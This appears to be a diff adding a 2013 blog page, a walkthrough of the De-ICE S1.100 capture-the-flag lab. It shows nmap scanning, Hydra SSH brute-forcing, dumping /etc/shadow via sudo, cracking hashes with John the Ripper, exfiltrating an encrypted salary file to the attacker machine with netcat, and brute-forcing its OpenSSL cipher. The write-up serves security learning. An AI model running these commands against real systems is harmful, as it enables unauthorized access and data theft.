@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>De-ICE S1.100 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2013-01-12">January 12, 2013</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/de-ice">de-ice</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">De-ICE S1.100</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>This is a walkthrough of how I completed the De-ICE S1.100 challenge.  The end goal is to obtain the CEO&rsquo;s salary information.</p>
+
+<h2 id="nmap:7ae3df20909f7f73a6199fc5ab833e91">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sV -A -p- 192.168.1.100
+ 
+PORT    STATE  SERVICE  VERSION
+20/tcp  closed ftp-data
+21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
+22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+|_sshv1: Server supports SSHv1
+25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
+| smtp-commands: slax.example.net Hello [192.168.1.200], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP,
+|_ 2.0.0 This is sendmail version 8.13.7 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use &quot;HELP &lt;topic&gt;&quot;. 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
+80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp open   pop3     Openwall popa3d
+143/tcp open   imap     UW imapd 2004.357
+|_imap-capabilities: CAPABILITY IDLE LOGIN-REFERRALS LITERAL+ THREAD=ORDEREDSUBJECT THREAD=REFERENCES SCAN MAILBOX-REFERRALS SORT NAMESPACE STARTTLS completed IMAP4REV1 OK AUTH=LOGINA0001 UNSELECT SASL-IR BINARY MULTIAPPEND
+443/tcp closed https
+</code></pre>
+
+<p>If you open up a web browser and go to 192.168.1.100, you will see a generic welcome page to the De-ICE challenge, with a link to see some hints if you get stuck.  To see the game related page, click the link at the bottom of the page and it will take you to <code>192.168.1.100/index2.php</code>.</p>
+
+<p>This page contains some names and email addresses of employee&rsquo;s.  I took a copy of this information, and used it to create a list of possible usernames.</p>
+
+<h2 id="hydra:7ae3df20909f7f73a6199fc5ab833e91">Hydra</h2>
+
+<p>I then attempted to use these usernames to bruteforce the SSH login.</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.100# hydra -L users -e nsr 192.168.1.100 ssh
+1 of 1 target completed, 0 valid passwords found
+</code></pre>
+
+<p>The nsr option checks for null password, login as password and reverse login as password.  Unfortunately, none of these attempts were successful.  Before attempting to use a large dictionary, I decided to look again at my list of users.  On a hunch, I swapped the surname and first initials around, so instead of marym I had mmary etc.</p>
+
+<p>I ran this through hydra again, but this time I got a successful hit.</p>
+
+<pre><code class="language-text">[22][ssh] host: 192.168.1.100   login: bbanter   password: bbanter
+1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+
+<h2 id="ssh-enumeration:7ae3df20909f7f73a6199fc5ab833e91">SSH &amp; Enumeration</h2>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.100# ssh bbanter@192.168.1.100
+bbanter @ 192.168.1.100's password: 
+Linux 2.6.16.
+bbanter@slax:~$ 
+</code></pre>
+
+<p>This version of Linux is running an old kernel, and is therefore likely to have privilege escalation exploits available.  However there is no gcc or python installed, which would make compiling and executing such exploits difficult.</p>
+
+<p>The passwd and group files yielded some interesting information.</p>
+
+<pre><code class="language-text">bbanter@slax:~$ cat /etc/passwd 
+root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
+aadams:x:1000:10:,,,:/home/aadams:/bin/bash
+bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
+ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash
+</code></pre>
+
+<p>This confirmed that these were the only three users on the system, so I went back and removed the others from my user list.</p>
+
+<pre><code class="language-text">bbanter@slax:~$ cat /etc/group 
+root::0:root
+wheel::10:root
+users::100:
+</code></pre>
+
+<p>Now I knew that bbanter and ccoffee were both members of the users (gid=100) group; and aadams was in the wheel (gid=10) group.  The wheel group traditionally allows its users sudo privileges and would therefore be a better account to attack compared to ccoffee.</p>
+
+<h2 id="hyrda-again:7ae3df20909f7f73a6199fc5ab833e91">Hyrda (again)</h2>
+
+<p><code>root@kali:~# hydra -l aadams -P /usr/share/wordlists/passwords 192.168.1.100 ssh</code></p>
+
+<p>The password file I used was based on the darkc0de wordlist.  To save time, I did some manipulation on it to remove all lines that contained numbers and special characters.  It was a gamble that the password wouldn&rsquo;t be too complicated.  It seems I got lucky.</p>
+
+<p><code>[22][ssh] host: 192.168.1.100   login: aadams   password: nostradamus</code></p>
+
+<h2 id="ssh-again:7ae3df20909f7f73a6199fc5ab833e91">SSH (again)</h2>
+
+<p>Since I was still logged in as bbanter, I used su to switch to aadams.</p>
+
+<pre><code class="language-text">bbanter@slax:~$ su aadams
+Password: ***********
+aadams@slax:/home/bbanter$ id
+uid=1000(aadams) gid=10(wheel) groups=10(wheel)
+</code></pre>
+
+<p>My next step was to check the sudo rights of aadams.</p>
+
+<pre><code class="language-text">aadams@slax:~$ sudo -l
+User aadams may run the following commands on this host:
+    (root) NOEXEC: /bin/ls
+    (root) NOEXEC: /usr/bin/cat
+    (root) NOEXEC: /usr/bin/more
+    (root) NOEXEC: !/usr/bin/su \*root\*
+</code></pre>
+
+<p>This made it a rather trivial exercise to obtain the shadow file.</p>
+
+<pre><code class="language-text">aadams@slax:~$ sudo cat /etc/shadow
+root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
+aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
+bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
+ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
+</code></pre>
+
+<h2 id="john-the-ripper:7ae3df20909f7f73a6199fc5ab833e91">John the Ripper</h2>
+
+<p>I copied these hashes to my machine and set <code>john</code> to work on cracking them (excluding bbanter and aadams, I kept ccoffee in there for the sake of completeness).</p>
+
+<pre><code class="language-text">root@kali:~/de-ice/1.100# john --rules --wordlist=/usr/share/wordlists/darkc0de.lst shadow
+tarot            (root)
+</code></pre>
+
+<p>Whilst john was working on these hashes, I used aadams&rsquo; sudo ls rights to browse the file system and eventually came across <code>/home/ftp/incoming/salary_dec2003.csv.enc</code>. I was able to sudo cat the file, which appeared to be in binary, but it could be piped to strings and more, to make some parts of it readable.</p>
+
+<p><code>aadams@slax:~$ sudo cat /home/ftp/incoming/salary_dec2003.csv.enc | strings | more</code></p>
+
+<p>A little research into the string <code>Salted__</code>, revealed this was a file encrypted using OpenSSL.</p>
+
+<h2 id="openssl:7ae3df20909f7f73a6199fc5ab833e91">OpenSSL</h2>
+
+<p>There are lots of options within OpenSSL for encrypting files, different ciphers etc.  To this end, I wrote a script that would attempt each cipher on the encrypted file - not forgetting the little clue in the passwd file:  &ldquo;DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION&rdquo;.  This indicated to me that the root password was used during the encryption and that it would be required for the decryption (good job <code>john</code> was able to crack the hash for root).</p>
+
+<p>To make this task a bit easier, I wanted to transfer the file to my Kali machine.  There is a (broken) FTP service running, but instead of spending time fixing that to transfer the file, I used netcat instead.</p>
+
+<p><code>root@kali:~/de-ice/1.100# nc -lnvvp 4444 &gt; salary_dec2003.csv.enc</code></p>
+
+<p>Switch to the root user, and&hellip;</p>
+
+<pre><code class="language-text">aadams@slax:~$ su -
+Password: *****
+
+root@slax:~# cd /home/ftp/incoming/
+root@slax:/home/ftp/incoming# nc 192.168.1.200 4444 &lt; salary_dec2003.csv.enc 
+</code></pre>
+
+<pre><code class="language-bash">#!/bin/bash
+openssl=/usr/bin/openssl
+ciphers=$($openssl list-cipher-commands)
+key=tarot
+in=salary_dec2003.csv.enc
+out=salary_dec2003.csv
+for i in $ciphers; do
+        $openssl enc -d -${i} -in ${in} -k ${key} &gt; /dev/null 2&gt;&amp;1;
+                if [[ $? == 0 ]]; then
+                $openssl enc -d -${i} -in ${in} -k ${key} -out ${out}
+                echo &quot;Successfully decrypted with ${i} and ${key}&quot;
+                exit 0; fi  
+done
+</code></pre>
+
+<pre><code class="language-text">,1,Charles E. Ophenia,&quot;$225,000.00&quot;,1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$360.00,$500.00,$860.00,183200299,1123245
+,2,Marie Mary,&quot;$56,000.00&quot;,1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1192291
+,3,Pat Patrick,&quot;$43,350.00&quot;,1,1,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,2334432
+,4,Terry Thompson,&quot;$27,500.00&quot;,1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$225.00,$350.00,183200299,1278235
+,5,Ben Benedict,&quot;$29,750.00&quot;,1,3,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$122.50,$247.50,183200299,2332546
+,6,Erin Gennieg,&quot;$105,000.00&quot;,1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1456567
+,7,Paul Michael,&quot;$76,000.00&quot;,1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1446756
+,8,Ester Long,&quot;$92,500.00&quot;,1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1776782
+,9,Adam Adams,&quot;$76,250.00&quot;,1,5,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,2250900
+,10,Chad Coffee,&quot;$55,000.00&quot;,1,1,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$0.00,$125.00,183200299,1590264
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2013  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
